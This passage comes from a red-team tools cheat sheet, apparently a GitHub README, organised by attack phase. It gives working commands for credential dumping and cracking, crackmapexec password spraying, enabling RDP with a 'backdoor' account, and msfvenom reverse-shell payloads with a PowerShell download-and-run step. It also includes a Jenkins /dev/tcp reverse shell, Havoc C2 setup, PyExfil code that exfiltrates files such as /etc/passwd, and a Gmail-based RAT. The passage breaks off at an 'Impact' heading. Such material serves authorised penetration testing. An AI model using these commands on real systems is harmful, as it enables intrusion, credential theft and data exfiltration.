**Install: (Binary)** 

You can install the standalone binary from [here](https://github.com/AlessandroZ/LaZagne/releases/).

**Usage:** 

```bash
# Launch all modes
.\laZagne.exe all

# Launch only a specific module
.\laZagne.exe browsers

# Launch only a specific software script
.\laZagne.exe browsers -firefox
```

![image](https://user-images.githubusercontent.com/100603074/208253800-48f960db-d569-4d1a-b39f-d6c7643691e2.png)


### [🔙](#redteam-tools)[hashcat](https://github.com/hashcat/hashcat)

Tool for cracking password hashes. Supports a large list of hashing algorithms (Full list can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes)).

**Install: Binary** 

You can install the standalone binary from [here](https://hashcat.net/hashcat/).

**Usage:** 

```bash
.\hashcat.exe --help
```

Nice hashcat command [cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/).

![image](https://user-images.githubusercontent.com/100603074/208263419-94bf92c0-1c83-4366-a6c2-b6533fdcc521.png)

### [🔙](#redteam-tools)[John the Ripper](https://github.com/openwall/john)

Another password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs and GPUs.

**Install:** 

```bash
sudo apt-get install john -y
```

**Usage:** 

```bash
john
```

![image](https://user-images.githubusercontent.com/100603074/208263690-8c2d1253-7261-47da-850d-ca5a8d98ca13.png)


Discovery
====================

### [🔙](#redteam-tools)[PCredz](https://github.com/lgandx/PCredz)

This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.

**Install:** 

```bash
git clone https://github.com/lgandx/PCredz
```

**Usage:** (PCAP File Folder) 

```python
python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
```

**Usage:** (Live Capture) 

```python
python3 ./Pcredz -i eth0 -v
```

![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)

### [🔙](#redteam-tools)[PingCastle](https://github.com/vletoux/pingcastle)

Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.

**Install:** (Download) 

```
https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip
```

**Usage:** 

```python
./PingCastle.exe
```

![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)

Lateral Movement
====================

### [🔙](#redteam-tools)[crackmapexec](https://github.com/Porchetta-Industries/CrackMapExec)

This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL’s into memory using Powershell, dumping the NTDS.dit and more.

**Install:** 

```bash
sudo apt install crackmapexec
```

**Usage:** 

```bash
crackmapexec smb <ip address> -d <domain> -u <user list> -p <password list>
```

![image](https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png)

### [🔙](#redteam-tools)Enabling RDP

```shell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
net localgroup "Remote Desktop Users" "backdoor" /add
```

### [🔙](#redteam-tools)Upgrading shell to meterpreter

Shells (https://infinitelogins.com/tag/payloads/)

After getting basic shell access to an endpoint a meterpreter is nicer to continue with.

**[attacker]** Generate a meterpreter shell:

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

![image](https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png)

**[victim]** Download to victim endpoint: 

```shell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"`
```

**[attacker]** Configure listener: 

```shell
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port run`
```

**[victim]** Execute payload:

```shell
Start-Process "shell-name.exe"`
```

![image](https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png)

### [🔙](#redteam-tools)Forwarding Ports	

Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.

```bash
socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &
```

### [🔙](#redteam-tools)Jenkins reverse shell

If you gain access to a jenkins script console you can use this to gain a reverse shell on the node.

```jenkins
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP_ADDRESS/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Collection
====================

### [🔙](#redteam-tools)[BloodHound](https://github.com/BloodHoundAD/BloodHound)

An application used to visualize active directory environments. A quick way to visualise attack paths and understand victims' active directory properties.

**Install:** [PenTestPartners Walkthrough](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)

**Custom Queries:** [CompassSecurity BloodHoundQueries](https://github.com/CompassSecurity/BloodHoundQueries) 

![image](https://user-images.githubusercontent.com/100603074/206549387-a63e5f0e-aa75-47f6-b51a-942434648ee2.png)


Command and Control
====================

### [🔙](#redteam-tools)[Havoc](https://github.com/HavocFramework/Havoc)

Havoc is a modern and malleable post-exploitation command and control framework, created by [@C5pider](https://twitter.com/C5pider).

Features include: Sleep Obfuscation, x64 return address spoofing, Indirect Syscalls for Nt* APIs

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
sudo apt install build-essential
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt update
sudo apt install python3.10 python3.10-dev
```

**Build + Usage:**

```bash
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/Client
make 
./Havoc 
```

**Pre-requisites:** (Ubuntu 20.04 / 22.04)

```bash
cd Havoc/Teamserver
go mod download golang.org/x/sys  
go mod download github.com/ugorji/go
```

**Build + Usage:**

```bash
cd Teamserver
./Install.sh
make
./teamserver -h
```

**Run the teamserver**

```bash
sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

*Full install, build and run instructions on the [wiki](https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD)*

![image](https://user-images.githubusercontent.com/100603074/206025215-9c7093e5-b45a-4755-81e6-9e2a52a1f455.png)

Exfiltration
====================

### [🔙](#redteam-tools)[PyExfil](https://github.com/ytisf/PyExfil)

"An Alpha-Alpha stage package, not yet tested (and will appreciate any feedbacks and commits) designed to show several techniques of data exfiltration is real-world scenarios."

**Install:** 

```bash
git clone https://www.github.com/ytisf/PyExfil;cd PyExfil;pip install -r requirements.txt;pip install py2exe;pip setup.py install
```

**Usage:** (Full Usage [here](https://github.com/ytisf/PyExfil/blob/master/USAGE.md))

#### HTTP Cookies

```python
from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen

# For Client (exfil)
send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)

# For Server (collecting)
listen(local_addr='127.0.0.1', local_port=80)
```

#### ICMP Echo 8

```python
from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener

# For Client (exfil)
ip_addr = "127.0.0.1"
send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)

# For Server (collecting)
init_listener(ip_addr, saving_location="/tmp/")
```

#### NTP Request

```python
from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT

# For Client (exfil)
ip_addr = "127.0.0.1"
exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)

# For Server (collecting)
ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
```

![image](https://user-images.githubusercontent.com/100603074/206573575-e90384c4-4a39-4f3c-96ec-face1f191808.png)

### [🔙](#redteam-tools)[Powershell RAT](https://github.com/Viralmaniar/Powershell-RAT)

Python based backdoor that uses Gmail to exfiltrate data as an e-mail attachment. It tracks the user activity using screen capture and sends the information to an attacker as an e-mail attachment.

**Install:** 

```bash
git clone https://github.com/Viralmaniar/Powershell-RAT
```

**Usage:** (Full Usage [here](https://github.com/Viralmaniar/Powershell-RAT/blob/master/README.md))

#### Setup

- Throwaway Gmail address
- Enable "Allow less secure apps" by going to https://myaccount.google.com/lesssecureapps
- Modify the `$username` & `$password` variables for your account in the Mail.ps1 Powershell file
- Modify `$msg.From` & `$msg.To.Add` with throwaway gmail address

![image](https://user-images.githubusercontent.com/100603074/206573667-7dec0942-f9ce-4946-871f-24e4521b6411.png)

Impact
====================

### [🔙](#redteam-tools)...
